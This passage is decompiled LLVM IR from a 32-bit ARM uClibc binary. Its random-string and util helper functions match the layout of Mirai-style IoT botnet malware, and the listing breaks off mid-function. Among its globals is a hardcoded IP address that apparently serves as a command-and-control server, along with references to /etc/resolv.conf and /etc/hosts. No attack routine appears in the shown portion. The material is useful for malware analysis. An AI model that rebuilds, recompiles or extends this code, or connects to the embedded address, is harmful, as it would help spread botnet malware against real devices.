source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.4 = constant i32 -352321502
@global_var_1b4f0.8 = global i32 0
@global_var_1b500.9 = global i32* @global_var_1b4f0.8
@global_var_1b878.16 = global i32 0
@global_var_1b4f4.19 = global i32 0
@global_var_9d44.23 = constant i32 -509558771
@global_var_1b89c.26 = global i32 0
@global_var_1b8a0.28 = global i32 0
@global_var_1b8a4.30 = local_unnamed_addr global i32 0
@global_var_1b8a8.32 = global i32 0
@global_var_11e44.38 = constant [37 x i8] c"kt8lmno5abghi6w7uvx2cdyz14pqef3rs9j0\00"
@global_var_11e6c.40 = constant [7 x i8] c"(null)\00"
@global_var_1b514 = external global i32
@global_var_1b61c.44 = global i32 256
@global_var_1b898.46 = global i32 0
@global_var_1b890.48 = global i32 0
@global_var_1b894.49 = local_unnamed_addr global i32 0
@global_var_1dafc.51 = global i32 0
@global_var_11e74.53 = constant [6 x i32] %wide-string
@global_var_11e78.55 = constant [5 x i32] %wide-string
@global_var_11e7c.57 = constant [4 x i32] %wide-string
@global_var_1b50c.62 = local_unnamed_addr global i32 -1
@global_var_11e34.64 = constant [15 x i8] c"191.96.112.131\00"
@global_var_1b508.65 = global [15 x i8]* @global_var_11e34.64
@global_var_11e80.67 = constant [3 x i32] %wide-string
@global_var_11e84.71 = constant i32 32
@global_var_1b51c = external local_unnamed_addr global i32
@global_var_1bac8.75 = global i32 0
@global_var_ab9c.77 = constant i32 -456978431
@global_var_1b8ac.81 = global i32 0
@global_var_ff00.82 = constant i32 76044
@global_var_1ba7c.84 = global i32 0
@global_var_1b8b0.86 = global i32 0
@global_var_1b714.88 = global i32 0
@global_var_1dbb4.94 = global i32 0
@global_var_1dba8.97 = global i32 0
@global_var_1db00.99 = global i32 0
@global_var_1ba90.101 = global i32 0
@global_var_1b520.104 = global i32* @global_var_1b61c.44
@global_var_1bab8.107 = global i32 0
@global_var_1db80.109 = global i32 0
@global_var_c5d4.110 = constant i32 -382910416
@global_var_b594.117 = constant i32 -442564520
@global_var_1b628.119 = global i32 0
@global_var_c62c.121 = constant i32 -481230848
@global_var_1baa8.123 = global i32 0
@global_var_a86c.125 = constant i32 -509587456
@global_var_1b640.127 = global i32 0
@global_var_1b658 = external global i32
@global_var_1b678.133 = global i32 -1726662223
@global_var_1b660.140 = local_unnamed_addr global i32* @global_var_1b678.133
@global_var_1b65c.142 = global i32* @global_var_1b678.133
@global_var_12488.156 = constant i32 0
@global_var_1b6f4.165 = global i32 0
@global_var_1baac.169 = local_unnamed_addr global i32 0
@global_var_c010.171 = constant i32 -352321524
@global_var_deb8.173 = constant i32 -382910416
@global_var_1b4e4.175 = global i32 -1
@global_var_1babc.178 = global i32 0
@global_var_1bac0.180 = local_unnamed_addr global i32 0
@global_var_c0a0.181 = constant i32 -390234096
@global_var_124b0.183 = constant [10 x i8] c"/dev/null\00"
@global_var_1bac4.185 = global i32 0
@global_var_de38.189 = constant i32 -382909968
@global_var_1bab0.191 = local_unnamed_addr global i32 0
@global_var_1bab4.193 = global i32 0
@global_var_ab10.195 = constant i32 -369096970
@global_var_124d0.201 = constant i32 0
@global_var_1b70c.202 = local_unnamed_addr global i32* @global_var_124d0.201
@global_var_aabc.207 = constant i32 -442564608
@global_var_c368.209 = constant i32 -335544559
@global_var_c484.212 = constant i32 -275775369
@global_var_1baec.215 = global i32 0
@global_var_1bacc.217 = global i32 0
@global_var_1bad0.221 = global i32 0
@global_var_1bae8.226 = local_unnamed_addr global i32 0
@global_var_a8c0.231 = constant i32 -382910448
@global_var_1dbb8.234 = global i32 0
@global_var_124bc.236 = constant i32 46
@global_var_1db98.238 = global i32 0
@global_var_b514.240 = constant i32 -481296384
@global_var_d42c.241 = constant i32 -369098656
@global_var_124c0.248 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_124d4.250 = constant i32 114
@global_var_124d8.252 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_124f0.255 = constant [11 x i8] c"nameserver\00"
@global_var_124fc.258 = constant [7 x i8] c"domain\00"
@global_var_12504.260 = constant [7 x i8] c"search\00"
@global_var_1dbbc.265 = global i32 0
@global_var_1dbc0.267 = global i32 0
@global_var_1b75c.273 = global i32 0
@global_var_1baf0.275 = global i32 0
@global_var_dadc.277 = constant i32 -442564544
@global_var_1baf4.279 = global i32 0
@global_var_1b774.285 = global i32 2
@global_var_1b744.291 = global i32 0
@global_var_ddb0.292 = constant i32 -442564492
@global_var_1b740.295 = global i32* bitcast (i8** @global_var_1b778.294 to i32*)
@global_var_1250c.302 = constant i32 0
@global_var_df70.307 = constant i32 -382910448
@global_var_f4cc.308 = constant i32 -382909968
@global_var_12538.336 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_12524.338 = constant i32 0
@global_var_1254c.341 = constant [3 x i8] c"%x\00"
@global_var_12550.344 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1255c.346 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1266e.349 = constant i32 65536
@global_var_1b86c.350 = global i32* @global_var_1266e.349
@global_var_10b90.351 = constant i32 -382910224
@global_var_1288c.353 = constant i32 135270416
@global_var_12870.355 = constant [6 x i8] c"(nil)\00"
@global_var_12878.358 = constant [7 x i8] c"(null)\00"
@global_var_12880.360 = constant i32 2949163
@global_var_1290c.363 = constant i32 16843008
@global_var_128f4.365 = constant i32 327688
@global_var_128ec.369 = constant [8 x i8] c" +0-#'I\00"
@global_var_12894.371 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_128d4.373 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_128c7.375 = constant i32 117506048
@global_var_128c8.377 = constant i32 252117248
@global_var_128b8.379 = constant i32 331776
@global_var_128a8.381 = constant i32 335616
@global_var_e174.383 = constant i32 -382908944
@global_var_12928.387 = constant [8 x i8] c"Success\00"
@global_var_12918.389 = constant [15 x i8] c"Unknown error \00"
@global_var_13484.392 = constant [4 x i8] c"inf\00"
@global_var_13487.396 = constant i32 1179535616
@global_var_13494.398 = constant i32 2883630
@global_var_1b4e8.408 = global i32 0
@global_var_1b874.6 = external global i8*
@global_var_c0b4.90 = constant i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_1b710.228 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_1b711.229 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_1b778.294 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_1b779.298 = local_unnamed_addr global i8 1
@global_var_1b7c9.299 = local_unnamed_addr global i8 1
@global_var_1b7c8.300 = local_unnamed_addr global i8 16

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1b874.6 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1b874.6 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1b500.9 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1b500.9 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1b500.9 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1b500.9 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1b874.6 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1b500.9, { 1, 0 }
  uselistorder i8** @global_var_1b874.6, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_1b4f4.19, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_1b4f4.19 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_1b4f4.19 to i32)

; uselistorder directives
  uselistorder i32* @global_var_1b4f4.19, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_9d44.23 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 73248, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  store i32 %v3_81d0, i32* %stack_var_-20, align 4
  %v2_81dc = call i32 @__GI_time(i32* null)
  store i32 %v2_81dc, i32* @global_var_1b89c.26, align 4
  %v0_81f0 = call i32 @__libc_getpid()
  store i32 %v0_81f0, i32* @r4, align 4
  %v0_81f8 = call i32 @getppid()
  %v0_8200 = load i32, i32* @r4, align 4
  %v2_8200 = xor i32 %v0_8200, %v0_81f8
  store i32 %v2_8200, i32* @global_var_1b8a0.28, align 4
  %v0_8210 = call i32 @clock()
  store i32 %v0_8210, i32* @global_var_1b8a4.30, align 4
  %v2_8230 = load i32, i32* @global_var_1b8a0.28, align 4
  %v2_8234 = xor i32 %v2_8230, %v0_8210
  store i32 %v2_8234, i32* @global_var_1b8a8.32, align 4
  %v2_8240 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_8240, i32* @r4, align 4
  ret i32 %v0_8210

; uselistorder directives
  uselistorder i32 %v0_8210, { 1, 0, 2 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_8254 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8254, i32* @ip, align 4
  %v2_8268 = load i32, i32* @global_var_1b89c.26, align 4
  %v3_8274 = mul i32 %v2_8268, 2048
  %v2_827c = xor i32 %v3_8274, %v2_8268
  %v3_8288 = udiv i32 %v2_827c, 256
  %v2_8290 = xor i32 %v3_8288, %v2_827c
  %v2_829c = load i32, i32* @global_var_1b8a0.28, align 4
  store i32 %v2_829c, i32* @global_var_1b89c.26, align 4
  %v2_82ac = load i32, i32* @global_var_1b8a4.30, align 4
  store i32 %v2_82ac, i32* @global_var_1b8a0.28, align 4
  %v2_82bc = load i32, i32* @global_var_1b8a8.32, align 4
  store i32 %v2_82bc, i32* @global_var_1b8a4.30, align 4
  %v3_82d0 = udiv i32 %v2_82bc, 524288
  %v2_82dc = xor i32 %v2_82bc, %v2_8290
  %v2_82f4 = xor i32 %v2_82dc, %v3_82d0
  store i32 %v2_82f4, i32* @global_var_1b8a8.32, align 4
  ret i32 %v2_82f4

; uselistorder directives
  uselistorder i32 %v2_82bc, { 1, 0, 2 }
  uselistorder i32 %v2_827c, { 1, 0 }
  uselistorder i32 %v2_8268, { 1, 0 }
  uselistorder i32* @global_var_1b8a8.32, { 0, 2, 1 }
  uselistorder i32* @global_var_1b8a4.30, { 0, 2, 1 }
  uselistorder i32* @global_var_1b8a0.28, { 0, 2, 3, 1 }
  uselistorder i32* @global_var_1b89c.26, { 0, 2, 1 }
}

define i32 @rand_str(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8330 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_83f04 = icmp sgt i32 %arg2, 0
  br i1 %v5_83f04, label %dec_label_pc_833c, label %dec_label_pc_83f4

dec_label_pc_833c:                                ; preds = %entry, %dec_label_pc_83e8.backedge
  %v3_8374 = phi i32 [ %v3_83e8.be, %dec_label_pc_83e8.backedge ], [ %arg2, %entry ]
  %stack_var_-24.06.in = phi i32 [ %stack_var_-24.0.in.be, %dec_label_pc_83e8.backedge ], [ %v0_8330, %entry ]
  %stack_var_-24.06 = inttoptr i32 %stack_var_-24.06.in to i8*
  store i32 %v3_8374, i32* %r3.global-to-local, align 4
  %v7_8344 = icmp slt i32 %v3_8374, 4
  br i1 %v7_8344, label %dec_label_pc_8374, label %dec_label_pc_8348

dec_label_pc_8348:                                ; preds = %dec_label_pc_833c
  store i32 %stack_var_-24.06.in, i32* %r4.global-to-local, align 4
  %v0_834c = call i32 @rand_next()
  store i32 %v0_834c, i32* %r0.global-to-local, align 4
  %v2_8354 = inttoptr i32 %stack_var_-24.06.in to i32*
  store i32 %v0_834c, i32* %v2_8354, align 4
  %v1_835c = add i32 %stack_var_-24.06.in, 4
  %v3_8364 = load i32, i32* %stack_var_-28, align 4
  %v1_8368 = add i32 %v3_8364, -4
  store i32 %v1_8368, i32* %r3.global-to-local, align 4
  store i32 %v1_8368, i32* %stack_var_-28, align 4
  br label %dec_label_pc_83e8.backedge

dec_label_pc_8374:                                ; preds = %dec_label_pc_833c
  store i32 %v3_8374, i32* %r3.global-to-local, align 4
  %v7_837c = icmp slt i32 %v3_8374, 2
  br i1 %v7_837c, label %dec_label_pc_83bc, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8374
  store i32 %stack_var_-24.06.in, i32* %r4.global-to-local, align 4
  %v0_8384 = call i32 @rand_next()
  store i32 %v0_8384, i32* %r0.global-to-local, align 4
  %v3_8390 = urem i32 %v0_8384, 65536
  store i32 %v3_8390, i32* %r3.global-to-local, align 4
  %v1_8394 = trunc i32 %v0_8384 to i8
  %v3_8394 = inttoptr i32 %stack_var_-24.06.in to i8*
  store i8 %v1_8394, i8* %v3_8394, align 1
  %v0_8398 = load i32, i32* %r3.global-to-local, align 4
  %v3_839810 = udiv i32 %v0_8398, 256
  %v1_839c = trunc i32 %v3_839810 to i8
  %v2_839c = load i32, i32* %r4.global-to-local, align 4
  %v3_839c = add i32 %v2_839c, 1
  %v4_839c = inttoptr i32 %v3_839c to i8*
  store i8 %v1_839c, i8* %v4_839c, align 1
  %v1_83a4 = add i32 %stack_var_-24.06.in, 2
  %v3_83ac = load i32, i32* %stack_var_-28, align 4
  %v1_83b0 = add i32 %v3_83ac, -2
  store i32 %v1_83b0, i32* %r3.global-to-local, align 4
  store i32 %v1_83b0, i32* %stack_var_-28, align 4
  br label %dec_label_pc_83e8.backedge

dec_label_pc_83bc:                                ; preds = %dec_label_pc_8374
  %v0_83bc = call i32 @rand_next()
  store i32 %v0_83bc, i32* %r0.global-to-local, align 4
  %v1_83cc = trunc i32 %v0_83bc to i8
  store i8 %v1_83cc, i8* %stack_var_-24.06, align 1
  %v1_83d4 = add i32 %stack_var_-24.06.in, 1
  %v3_83dc = load i32, i32* %stack_var_-28, align 4
  %v1_83e0 = add i32 %v3_83dc, -1
  store i32 %v1_83e0, i32* %r3.global-to-local, align 4
  store i32 %v1_83e0, i32* %stack_var_-28, align 4
  br label %dec_label_pc_83e8.backedge

dec_label_pc_83e8.backedge:                       ; preds = %dec_label_pc_83bc, %dec_label_pc_8348, %dec_label_pc_8380
  %v3_83e8.be = phi i32 [ %v1_83b0, %dec_label_pc_8380 ], [ %v1_8368, %dec_label_pc_8348 ], [ %v1_83e0, %dec_label_pc_83bc ]
  %stack_var_-24.0.in.be = phi i32 [ %v1_83a4, %dec_label_pc_8380 ], [ %v1_835c, %dec_label_pc_8348 ], [ %v1_83d4, %dec_label_pc_83bc ]
  store i32 %v3_83e8.be, i32* %r3.global-to-local, align 4
  %v5_83f0 = icmp sgt i32 %v3_83e8.be, 0
  br i1 %v5_83f0, label %dec_label_pc_833c, label %dec_label_pc_83e8.dec_label_pc_83f4_crit_edge

dec_label_pc_83e8.dec_label_pc_83f4_crit_edge:    ; preds = %dec_label_pc_83e8.backedge
  %v12_83f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83f4

dec_label_pc_83f4:                                ; preds = %dec_label_pc_83e8.dec_label_pc_83f4_crit_edge, %entry
  %v12_83f8 = phi i32 [ %v12_83f8.pre, %dec_label_pc_83e8.dec_label_pc_83f4_crit_edge ], [ %v0_8330, %entry ]
  ret i32 %v12_83f8

; uselistorder directives
  uselistorder i32 %v3_83e8.be, { 1, 2, 0 }
  uselistorder i32 %v0_8384, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.06.in, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v3_8374, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8330, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder label %dec_label_pc_83e8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_833c, { 1, 0 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-65 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_8400 = load i32, i32* @fp, align 4
  store i32 %v3_8400, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %stack_var_-76, align 4
  %v2_8418 = ptrtoint i32* %stack_var_-65 to i32
  store i32 37, i32* @ip, align 4
  store i32 %v2_8418, i32* @r0, align 4
  store i32 ptrtoint ([37 x i8]* @global_var_11e44.38 to i32), i32* @r1, align 4
  store i32 37, i32* @r2, align 4
  %v0_842c = call i32 @memcpy()
  store i32 %v0_842c, i32* %r0.global-to-local, align 4
  %v3_8508.pr = load i32, i32* %stack_var_-76, align 4
  %v5_851011 = icmp sgt i32 %v3_8508.pr, 0
  br i1 %v5_851011, label %dec_label_pc_8434.lr.ph, label %dec_label_pc_8514

dec_label_pc_8434.lr.ph:                          ; preds = %entry
  %v13_8400 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8484 = add i32 %v13_8400, -49
  br label %dec_label_pc_8434

dec_label_pc_8434:                                ; preds = %dec_label_pc_8434.lr.ph, %dec_label_pc_8508.backedge
  %v3_8434 = phi i32 [ %v3_8508.pr, %dec_label_pc_8434.lr.ph ], [ %storemerge, %dec_label_pc_8508.backedge ]
  %stack_var_-72.112 = phi i8* [ %arg1, %dec_label_pc_8434.lr.ph ], [ %stack_var_-72.1.be, %dec_label_pc_8508.backedge ]
  %tmp27 = icmp ult i32 %v3_8434, 4
  %v0_84cc = call i32 @rand_next()
  store i32 %v0_84cc, i32* %r0.global-to-local, align 4
  br i1 %tmp27, label %dec_label_pc_84cc, label %dec_label_pc_8458.lr.ph

dec_label_pc_8458.lr.ph:                          ; preds = %dec_label_pc_8434
  %v5_8448 = trunc i32 %v0_84cc to i8
  br label %dec_label_pc_8458

dec_label_pc_8458:                                ; preds = %dec_label_pc_8458.lr.ph, %dec_label_pc_8458
  %storemerge28 = phi i32 [ 0, %dec_label_pc_8458.lr.ph ], [ %v1_84a8, %dec_label_pc_8458 ]
  %stack_var_-72.07 = phi i8* [ %stack_var_-72.112, %dec_label_pc_8458.lr.ph ], [ %v5_84a0, %dec_label_pc_8458 ]
  %stack_var_-24.06 = phi i8 [ %v5_8448, %dec_label_pc_8458.lr.ph ], [ %v5_8468, %dec_label_pc_8458 ]
  %v4_8458 = sext i8 %stack_var_-24.06 to i32
  %v3_8464 = udiv i32 %v4_8458, 256
  %v5_8468 = trunc i32 %v3_8464 to i8
  %div = udiv i8 %stack_var_-24.06, 8
  %v3_8470 = zext i8 %div to i32
  %v2_8488 = add i32 %v2_8484, %v3_8470
  %v1_848c = inttoptr i32 %v2_8488 to i8*
  %v2_848c = load i8, i8* %v1_848c, align 1
  %v4_8490 = ptrtoint i8* %stack_var_-72.07 to i32
  store i8 %v2_848c, i8* %stack_var_-72.07, align 1
  %v1_849c = add i32 %v4_8490, 1
  %v5_84a0 = inttoptr i32 %v1_849c to i8*
  %v1_84a8 = add i32 %storemerge28, 1
  %tmp28 = icmp ult i32 %v1_84a8, 4
  br i1 %tmp28, label %dec_label_pc_8458, label %dec_label_pc_84bc

dec_label_pc_84bc:                                ; preds = %dec_label_pc_8458
  %v3_84bc = load i32, i32* %stack_var_-76, align 4
  %v1_84c0 = add i32 %v3_84bc, -4
  br label %dec_label_pc_8508.backedge

dec_label_pc_84cc:                                ; preds = %dec_label_pc_8434
  %v2_84dc = urem i32 %v0_84cc, 37
  store i32 %v2_84dc, i32* %r0.global-to-local, align 4
  %v4_84e8 = ptrtoint i8* %stack_var_-72.112 to i32
  %v1_84ec = trunc i32 %v2_84dc to i8
  store i8 %v1_84ec, i8* %stack_var_-72.112, align 1
  %v1_84f4 = add i32 %v4_84e8, 1
  %v5_84f8 = inttoptr i32 %v1_84f4 to i8*
  %v3_84fc = load i32, i32* %stack_var_-76, align 4
  %v1_8500 = add i32 %v3_84fc, -1
  br label %dec_label_pc_8508.backedge

dec_label_pc_8508.backedge:                       ; preds = %dec_label_pc_84cc, %dec_label_pc_84bc
  %storemerge = phi i32 [ %v1_8500, %dec_label_pc_84cc ], [ %v1_84c0, %dec_label_pc_84bc ]
  %stack_var_-72.1.be = phi i8* [ %v5_84f8, %dec_label_pc_84cc ], [ %v5_84a0, %dec_label_pc_84bc ]
  store i32 %storemerge, i32* %stack_var_-76, align 4
  %v5_8510 = icmp sgt i32 %storemerge, 0
  br i1 %v5_8510, label %dec_label_pc_8434, label %dec_label_pc_8508.dec_label_pc_8514_crit_edge

dec_label_pc_8508.dec_label_pc_8514_crit_edge:    ; preds = %dec_label_pc_8508.backedge
  %v9_8518.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8514

dec_label_pc_8514:                                ; preds = %dec_label_pc_8508.dec_label_pc_8514_crit_edge, %entry
  %v9_8518 = phi i32 [ %v9_8518.pre, %dec_label_pc_8508.dec_label_pc_8514_crit_edge ], [ %v0_842c, %entry ]
  %v2_8518 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8518, i32* @fp, align 4
  ret i32 %v9_8518

; uselistorder directives
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_84cc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-76, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 1 }
  uselistorder label %dec_label_pc_8458, { 1, 0 }
  uselistorder label %dec_label_pc_8434, { 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_854c

dec_label_pc_854c:                                ; preds = %dec_label_pc_854c, %entry
  %v3_8564 = phi i8* [ %arg1, %entry ], [ %v5_856c, %dec_label_pc_854c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_8544, %dec_label_pc_854c ]
  %v4_854c = ptrtoint i8* %v3_8564 to i32
  %v2_8550 = load i8, i8* %v3_8564, align 1
  %v2_8554 = icmp eq i8 %v2_8550, 0
  %v1_8568 = add i32 %v4_854c, 1
  %v5_856c = inttoptr i32 %v1_8568 to i8*
  %v1_8544 = add i32 %storemerge2, 1
  br i1 %v2_8554, label %dec_label_pc_8578, label %dec_label_pc_854c

dec_label_pc_8578:                                ; preds = %dec_label_pc_854c
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v3_8564, { 1, 0 }
}

define i32 @util_memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v1_85e45 = add i32 %arg3, -1
  store i32 %v1_85e45, i32* %stack_var_-36, align 4
  %v3_85f06 = icmp eq i32 %arg3, 0
  br i1 %v3_85f06, label %dec_label_pc_85f8, label %dec_label_pc_85b8

dec_label_pc_85b8:                                ; preds = %entry, %dec_label_pc_85b8
  %stack_var_-24.012 = phi i8* [ %v5_85d0, %dec_label_pc_85b8 ], [ %arg1, %entry ]
  %storemerge411 = phi i32 [ %v1_85d8, %dec_label_pc_85b8 ], [ %arg2, %entry ]
  %storemerge = inttoptr i32 %storemerge411 to i8*
  %v2_85bc = load i8, i8* %storemerge, align 1
  %v4_85c0 = ptrtoint i8* %stack_var_-24.012 to i32
  store i8 %v2_85bc, i8* %stack_var_-24.012, align 1
  %v1_85cc = add i32 %v4_85c0, 1
  %v5_85d0 = inttoptr i32 %v1_85cc to i8*
  %v1_85d8 = add i32 %storemerge411, 1
  %v3_85e0.pr = load i32, i32* %stack_var_-36, align 4
  %v1_85e4 = add i32 %v3_85e0.pr, -1
  store i32 %v1_85e4, i32* %stack_var_-36, align 4
  %v3_85f0 = icmp eq i32 %v3_85e0.pr, 0
  br i1 %v3_85f0, label %dec_label_pc_85f8, label %dec_label_pc_85b8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85b8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 2, 1, 0 }
  uselistorder label %dec_label_pc_85b8, { 1, 0 }
}

define i32 @util_strcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_8604 = load i32, i32* @fp, align 4
  %v1_861c = inttoptr i32 %arg2 to i8*
  %v2_861c = call i32 @util_strlen(i8* %v1_861c)
  %v1_862c = add i32 %v2_861c, 1
  %v3_863c = inttoptr i32 %arg1 to i8*
